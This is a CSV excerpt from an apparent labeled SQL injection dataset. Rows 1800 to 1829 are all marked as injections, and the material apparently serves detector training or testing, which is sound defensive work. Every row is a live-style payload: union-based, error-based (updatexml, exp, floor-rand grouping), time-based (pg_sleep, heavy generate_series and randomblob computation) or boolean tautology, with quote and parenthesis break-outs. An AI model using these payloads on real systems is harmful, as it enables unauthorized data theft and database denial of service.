row_index,payload_norm,label,sqli_type_hint
1800,"1' where 2332 = 2332 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
1801,"-2715' ) ) union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1,
1802,1' where 8128 = 8128,1,
1803,"1 ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
1804,"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",1,
1805,"1 ) as qjjm where 3850 = 3850 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
1806,"1%"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
1807,"-2748' ) ) as gazw where 4624 = 4624 union all select 4624,4624#",1,
1808,"1"" where 9804 = 9804 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
1809,"1"" ) as fkgs where 5948 = 5948 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
1810,"-6170 ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
1811,"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",1,
1812,"1"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""tiet"" like ""tiet",1,
1813,"1' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
1814,1%' ) ) ) and 1661 = 7683,1,
1815,"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""gmld"" like ""gmld",1,
1816,end and 'blit' = 'blit,1,
1817,"1' ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1818,"1' ) as vpop where 2528 = 2528 union all select null,null,null,null,null,null,null#",1,
1819,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'beju' like 'beju",1,
1820,"1'|| ( select 'jbgg' from dual where 1986 = 1986 union all select null,null,null,null,null,null,null,null,null,null#",1,
1821,"-5903%"" ) ) ) or 3038 = 3038",1,
1822,select ( case when ( 4572 = 4086 ) then 1 else 4572* ( select 4572 from master..sysdatabases ) end ) --,1,
1823,"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'tmwy' = 'tmwy",1,
1824,"1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""vcjt"" like ""vcjt",1,
1825,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) )",1,
1826,"-4980"" or ( 8459 = 8459 ) *4906 and ""mnlj"" like ""mnlj",1,
1827,"-2044%' ) ) or elt ( 9299 = 3618,3618 ) and ( ( '%' = '",1,
1828,"1"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1829,"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'zoxm' like 'zoxm",1,
